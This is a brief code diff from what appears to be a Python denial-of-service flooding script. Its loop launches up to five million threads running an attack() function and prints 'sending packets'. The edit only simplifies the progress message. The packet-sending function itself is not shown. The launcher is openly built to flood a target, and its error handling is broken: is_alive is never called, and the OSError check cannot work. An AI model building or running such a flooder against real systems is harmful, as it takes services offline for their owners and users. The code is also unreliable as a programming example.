@@ -26,13 +26,8 @@ def attack():
 for i in range(5000000):
     thread = threading.Thread(target=attack)
     thread.start()
-    if(thread.is_alive):
-        print("sending packets.")
-        time.sleep(0.3)
-        print("sending packets..")
-        time.sleep(0.3)
-        print("sending packets...")
-        time.sleep(0.3)
+    if thread.is_alive:
+        print("sending packets")
     elif OSError or Exception in thread:
         thread.start()
     else:
